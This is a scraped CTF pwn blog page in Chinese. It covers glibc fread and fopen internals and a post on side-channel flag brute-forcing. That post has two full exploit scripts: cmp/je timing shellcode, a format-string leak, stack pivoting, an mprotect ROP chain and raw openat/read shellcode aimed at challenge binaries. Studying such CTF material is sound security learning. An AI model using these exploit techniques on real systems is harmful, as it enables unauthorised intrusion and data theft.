<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure>

<p>此时的_IO_FILE结构体各个字段如下</p>
<img src="https://s2.loli.net/2022/08/11/7NyOSiozVua2W3l.png" alt="image-20220810183427096" style="zoom:50%;" />

<p>然后此时调用了虚表中的_IO_file_read函数(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/11/2wpmz16rJixnuAE.png" alt="image-20220810183730754"></p>
<p>而后该函数进行了系统调用read，它的第二个参数也就是fp-&gt;_IO_buf_base的值，第三个参数就是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base的值。此时也才终于将文件中的数据读入到了resever area中(我认为现在数据还并不是在输入缓冲区中，因为按照定义的话_IO_read_end  _IO_read_base之间的才属于输入缓冲区，而现在还没有挪动_IO_read_end指针，因此严谨一些的话，现在数据是属于resever area中的)</p>
<p><img src="https://s2.loli.net/2022/08/11/ukGAYwK3PVNv1ly.png" alt="image-20220810184138466"></p>
<p>而后_IO_SYSREAD函数返回，read系统调用读入的字节数返回给变量count。此时执行到fp-&gt;_IO_read_end +&#x3D; count才算是将_IO_read_end 的指针移动，现在可以说是刚刚写入的数据位于了输入缓冲区中。</p>
<p><img src="https://s2.loli.net/2022/08/11/JnxizwrePEjB9Ts.png" alt="image-20220810185946550"></p>
<p>由于第二部分和第三部分是位于while循环中的，因此第三部分执行后，再次来到了第二部分。这回fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr的值是存在的，所以这次就可以进入if去执行memcpy函数了(如下)</p>
<img src="https://s2.loli.net/2022/08/11/Z28dwmJCfMTI1LA.png" alt="image-20220810190631208" style="zoom:50%;" />



<p>兜兜转转了很久，一直都是围绕着数据从文件中写到输入缓冲区中的操作，终于到了memcpy函数，通过这个拷贝函数，我们就可以将输入缓冲区中的数据拷贝指定的字节数到指定的地址，最后将指针_IO_read_ptr进行更新(如下图)，同时将want置零。</p>
<img src="https://s2.loli.net/2022/08/11/wFEjuN5IMZfL3ns.png" alt="image-20220810191534235" style="zoom:50%;" />

<p>该fread函数的源码分析至此就结束了，看一下最后的_IO_FILE结构体</p>
<img src="https://s2.loli.net/2022/08/11/6PqiupBO3AMNLf4.png" alt="image-20220810200528302" style="zoom:50%;" />

<h2 id="总结fread函数调用流程："><a href="#总结fread函数调用流程：" class="headerlink" title="总结fread函数调用流程："></a>总结fread函数调用流程：</h2><p>先判断是否存在reserve area(没有的话就malloc申请出来)，再去判断输入缓冲区是否还有剩余区域，如果有的话就直接拷贝输入缓冲区剩余部分的数据，如果没有的话，执行系统调用read从文件中读取数据到输入缓冲区中，然后循环再次去执行memcpy函数拷贝输入缓冲区的数据。</p>
<p>因为是初学IO，因此有些地方可能会理解有误，如果存在问题欢迎师傅们斧正</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177958#h3-3">IO FILE之fread详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p> <a target="_blank" rel="noopener" href="http://blog.leanote.com/post/mut3p1g/file-struct">(leanote.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fread">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">IO FILE之fwrite详解 « 平凡路上 (ray-cp.github.io)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/82a683c0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/82a683c0.html" class="post-title-link" itemprop="url">关于侧信道爆破的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:49:27" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="什么是侧信道爆破？"><a href="#什么是侧信道爆破？" class="headerlink" title="什么是侧信道爆破？"></a>什么是侧信道爆破？</h2><p>侧信道攻击是一种非常有趣的攻击手法，在pwn中通常为侧信道爆破。我的理解是侧信道爆破是指在程序没有正常回显的情况下通过执行精心构造后的数据，获取一些程序的现象或反馈来确定最终正确的flag，这种反馈比如有程序回显的错误，或者死循环等等。</p>
<blockquote>
<p>使用前提：</p>
<p>1、侧信道爆破需要执行我们编写的shellcode(因为程序中必然无法找到全部对应的gadget)，因此能够写入和执行一定字节的shellcode是必要的</p>
<p>2、程序在禁用了execve系统调用后，同时关闭了标准输出流后，才有必要使用侧信道爆破。</p>
<p>3、同时<strong>标准错误不能被关闭</strong>(因为我们需要它来反馈信息)，还必须要保证read可以从指定文件中读取flag，open或者openat系统调用要保证至少有一个可用。</p>
<p>攻击效果：在程序禁用了部分系统调用并且关闭了正常回显后，通过程序反馈的信息对进行flag逐位爆破。</p>
</blockquote>
<h2 id="侧信道爆破的整体思路"><a href="#侧信道爆破的整体思路" class="headerlink" title="侧信道爆破的整体思路:"></a>侧信道爆破的整体思路:</h2><p>首先需要想办法在程序中写入一段shellcode并且能将其执行。然后我们先执行open系统调用(如果open被禁用的话可以使用openat系统调用)，将flag文件打开返回一个文件描述符，然后用read系统调用将文件中的内容读到一片可读写的内存上，然后布置一段与flag比较的shellcode，这段shellcode的编写思路如下。</p>
<p>首先核心是用cmp指令将读入内存中的flag取一位来与我们给出的一个字符做对比，如果发现flag取的这一位与我们给出的字符一样就跳回到cmp指令处，因为字符都没变化，cmp比较后还是同样的结果，再次跳转回cmp指令处，这样无限循环程序不会有任何的回显。如果cmp比较后发现flag取一位得到的字符与我们所给的字符不同，就不进行跳转继续往下执行，我们不在后面布置任何的指令，这样程序继续往后执行，最终必然会崩溃。而我们根据程序在一定时间内是否反馈了崩溃信息来判断我们的flag是否判断正确(用je或者jz指令来实现这个跳转)</p>
<p>上面这段与flag对比的shellcode如下：</p>
<p><strong>(这段shellcode第一行并不通用，我们需要自己根据题目的情况将flag字符串的首地址放入rax，后面的三行汇编指令才是通用的)</strong>  另外汇编指令本身中的{}自然是非法的，这里所出现的{}是配合python脚本中的format方法(这个{}则是在爆破中的变量，因此需要占位符)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,rsi</span><br><span class="line">mov bl,byte ptr [rax+&#123;&#125;]</span><br><span class="line">cmp bl,&#123;&#125;</span><br><span class="line">je $-3</span><br></pre></td></tr></table></figure>

<p>第一行就是将flag字符串的首地址给rax(这一行并不通用，根据题目自行修改)。</p>
<p>第二行将flag中的某一位取出。{}是相对于flag首地址的偏移，用来确定到底是取哪一位。通俗来将第二行的{}决定了正在爆破的是flag的哪一位。</p>
<p>第三行则将我们给出的字符与flag中的某一位进行比较</p>
<p>第四行如果cmp比较时，二者不相同就不会跳转。如果相同的话就将跳到当前指令的地址-3的位置，而cmp那个指令的机器码就是三字节，因此-3又回到了cmp执行前。由于我们给出的字符没有变，所以将无限循环下去。</p>
<p>上述的内容为核心步骤，最后整体的话需要用两个循环嵌套一下，大循环为while 1**(也就是不断循环下去，这个循环每走完一次就说明flag已经爆破出了一位)<strong>，小循环为for循环遍历我们给出flag中可能出现的字符组成的字符串</strong>(这个循环走一次就说明对flag中的某一位进行了判断，如果判断正确的话(也就是陷入了死循环)就break跳出当前循环，否则继续遍历字符串)**</p>
<p>具体的话结合相关题目练习一下吧</p>
<h2 id="相关例题："><a href="#相关例题：" class="headerlink" title="相关例题："></a>相关例题：</h2><h3 id="xman-2019-nooocall"><a href="#xman-2019-nooocall" class="headerlink" title="xman_2019_nooocall"></a>xman_2019_nooocall</h3><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/image-20220803100743845.png" alt="image-20220803100743845"></p>
<p>发现保护全开，并且沙箱禁用了所有的系统调用。</p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="/../img/image-20220803100927931.png" alt="image-20220803100927931"></p>
<p>虽然系统调用都禁用了，但程序自己将flag读到了v5的位置，因此还是可以使用侧信道爆破的。可以发现程序自己读入了16个字节的shellcode，并将其执行。这就纯纯考的侧信道爆破了，下面就直接放脚本了，毕竟思路啥的上面已经说过了。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;-abcdefghijl01234567898&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add al, 2</span></span><br><span class="line"><span class="string">sal rax, 32</span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="comment"># debug(p,&#x27;pie&#x27;,0xD87)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28383</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your Shellcode &gt;&gt;&#x27;</span>, asm(shellcode.<span class="built_in">format</span>(index, <span class="built_in">list</span>[i])))</span><br><span class="line">        judge = p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            <span class="comment">#log_info(&#x27;success!&#x27;)</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">    <span class="comment">#log_info(flag)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>​					<img src="/../img/image-20220803102650387.png" alt="image-20220803102650387"></p>
<h3 id="ctfshow-卷王杯-checkin"><a href="#ctfshow-卷王杯-checkin" class="headerlink" title="ctfshow-卷王杯-checkin"></a>ctfshow-卷王杯-checkin</h3><h4 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/image-20220803103106146.png" alt="image-20220803103106146"></p>
<p><img src="/../img/image-20220803103501444.png" alt="image-20220803103501444"></p>
<p>这题winmt师傅本意考的是侧信道爆破，但是忘记禁用execve系统调用了哈哈。这里我只记录侧信道爆破的方法。</p>
<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p><img src="/../img/image-20220803103711730.png" alt="image-20220803103711730"></p>
<p>存在一个格式化字符串漏洞，很明显这里肯定是来泄露地址的，然后第二个read上存在溢出，但是溢出字节较少因此肯定要打一个栈迁移，然后我们用%p%25$p来泄露栈地址和libc地址。</p>
<h4 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h4><p>迁移到第二次read写入的数据上，先执行mprotect函数让此处的栈区变成可读可写可执行。因为这0x90的字节不够布置rop链的因此再用read系统调用来读入一次数据到栈上(这次数据的数量我们是可控的)。</p>
<p>接下来的第二次rop链，有两个问题，第一个是open系统调用被禁用了所以我们用openat来代替，第二个问题就是如果执行read系统调用那么它的文件描述符必须是0，因此采用的对抗策略是将标准输入用close关闭，然后再用openat打开flag文件，此时返回的文件描述符就是0了。然后就是read将flag读出来，然后用侧信道爆破的shellcode处理一下即可。</p>
<p>最后要注意的是openat这个系统调用，如果是绝对路径的话那么直接当成open用就行(不过还得给第一个参数和第三个参数，路径位于第二个参数的位置)，如果是相对路径的话，第二个参数的路径是相对于第一个参数文件描述符的位置来说的，如果想相对于当前工作目录的路径来说的话，需要第一个参数为-100(第三个参数也需要是正常的，具体的话查一下手册或者百度都行)</p>
<p><img src="/../img/image-20220803110340977.png" alt="image-20220803110340977"></p>
<p>但是不知道为啥，我只要用相对路径的话，openat系统调用也能顺利执行，但是莫名其妙就把我本地的flag文件给删了，我也是很懵，本地的话只能用绝对路径来搞。</p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">s=<span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">        <span class="comment">#p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28080)</span></span><br><span class="line">        leave_ret=<span class="number">0x401402</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Please leave your name :\n&#x27;</span>,<span class="string">&#x27;%p%25$p&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">        leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_libc_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">        target_addr=leak_stack_addr+<span class="number">0x10</span></span><br><span class="line">        libc_base_addr=leak_libc_addr-<span class="number">0x271e3</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;libc_base_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#debug(p,0x401403)</span></span><br><span class="line">        pop_rsi=libc_base_addr+<span class="number">0x2709c</span></span><br><span class="line">        pop_rdx_r12=libc_base_addr+<span class="number">0x11c421</span></span><br><span class="line">        pop_rdi=libc_base_addr+<span class="number">0x26bb2</span></span><br><span class="line">        syscall=libc_base_addr+<span class="number">0x2588d</span></span><br><span class="line">        pop_rax=libc_base_addr+<span class="number">0x28ff4</span></span><br><span class="line">        mprotect=libc_base_addr+<span class="number">0x11bbb0</span></span><br><span class="line">        bin_sh_addr=<span class="number">0x00000000001b6613</span>+libc_base_addr</span><br><span class="line">        rop=p64(pop_rdi)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        rop+=p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(leak_stack_addr+<span class="number">0x68</span>)</span><br><span class="line">        rop+=<span class="string">b&quot;\x48\x89\xE6\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC2\x00\x02\x00\x00\x0F\x05&quot;</span></span><br><span class="line">        payload=rop.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(target_addr-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Now, please tell us more about you to check in :\n&#x27;</span>,payload)</span><br><span class="line">        rop=<span class="string">b&quot;\x90&quot;</span>*<span class="number">23</span>+<span class="string">&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x68\x01\x01\x00\x00\x58\x6A\x00\x5A\x6A\x9C\x5F\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x0F\x05\x68\x60\x40\x40\x00\x5E\x6A\x00\x5F\x6A\x30\x5A\x48\x31\xC0\x0F\x05&quot;</span></span><br><span class="line">        shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax,rsi</span></span><br><span class="line"><span class="string">        mov bl,byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        je $-3</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        rop+=asm(shellcode.<span class="built_in">format</span>(index,<span class="built_in">list</span>[i]))</span><br><span class="line">        p.sendline(rop)</span><br><span class="line">        judge=p.can_recv(timeout=<span class="number">3</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            log_info(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">            <span class="comment">#log_info(flag)</span></span><br><span class="line">        <span class="comment">#log(&#x27;i&#x27;,chr(list[i]))</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我比较喜欢用自己汇编转的机器码，但是机器码的话，各位师傅肯定看的不方便，我这里给一下我rop链机器码对应的汇编指令。填充这么多nop指令是因为我构造的rop链中的read系统调用输入的数据需要nop指令占一下位，才能将有效指令写到执行流上。(可以调read的第二个参数，但我当时懒的弄了，这样省事)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rsi,rsp</span><br><span class="line">mov    rdi,0x0</span><br><span class="line">mov    rdx,0x200</span><br><span class="line">syscall</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 3</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 257</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">pop rdx</span><br><span class="line">push -100</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi, 0x67616c662f</span><br><span class="line">push rsi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">push 0x404060</span><br><span class="line">pop rsi</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 0x30</span><br><span class="line">pop rdx</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20220803111703647.png" alt="image-20220803111703647"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15674233.html">roderick师傅的博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/winmt/articles/15943249.html">winmt师傅的博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/The_perfect_world/article/details/89280224">https://blog.csdn.net/The_perfect_world/article/details/89280224</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ce09b1a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ce09b1a.html" class="post-title-link" itemprop="url">IO学习--源码调试fopen函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:49:50" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">源码调试&&分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>这篇文章是学习IO，进行源码分析四部曲中的第一篇，本篇主要就是<strong>源码调试fopen函数</strong>，并<strong>没有单独对fopen函数的源码专门阅读分析</strong>(之后的三篇基本上是源码分析)。如果要看fopen函数源码分析的话可以去看下文末的参考文章(师傅们写的都非常好诶)</p>
<p>这里我写了一篇关于初学者应该如何去读glibc源码的文章(希望可以帮助到刚刚入门的师傅们) <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16582817.html">here</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>_IO_FILE_plus结构包含了_IO_FILE结构体和 _IO_jump_t 结构体。</p>
<h3 id="IO-FILE结构体"><a href="#IO-FILE结构体" class="headerlink" title="_IO_FILE结构体"></a>_IO_FILE结构体</h3><p>先说_IO_FILE结构体，该结构体就是标准IO库中用来描述文件的结构，在程序执行fopen函数时会创建该结构，并分配在堆中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span> </span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



